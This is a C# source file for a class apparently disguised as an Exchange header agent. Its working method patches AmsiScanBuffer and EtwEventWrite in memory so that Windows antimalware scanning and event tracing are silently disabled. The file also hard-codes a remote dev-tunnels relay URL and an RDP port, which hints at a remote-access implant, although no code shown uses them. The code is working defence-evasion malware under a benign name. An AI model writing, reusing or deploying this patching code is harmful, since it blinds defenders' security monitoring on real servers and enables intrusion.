using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Web;

public sealed class ExchangeHeaderAgent
{
    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    private static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    private static extern IntPtr GetProcAddress(IntPtr module, string name);

    [DllImport("kernel32.dll")]
    private static extern bool VirtualProtect(IntPtr address, UIntPtr size,
        uint protection, out uint oldProtection);

    private static readonly byte[] Key = new byte[32];
    private const string Relay = "wss://ftgwd1nc-8443.euw.devtunnels.ms";
    private const int RemoteDesktopPort = 3389;

    public static void BlindTelemetry()
    {
        Patch("amsi.dll", "AmsiScanBuffer", new byte[] { 0x31, 0xC0, 0xC3 });
        Patch("ntdll.dll", "EtwEventWrite", new byte[] { 0x33, 0xC0, 0xC3 });
    }

    private static void Patch(string moduleName, string exportName, byte[] patch)
    {
        IntPtr module = LoadLibrary(moduleName);
        IntPtr export = GetProcAddress(module, exportName);
        uint oldProtection;
        VirtualProtect(export, (UIntPtr)patch.Length, 0x40, out oldProtection);
        Marshal.Copy(patch, 0, export, patch.Length);
    }
}
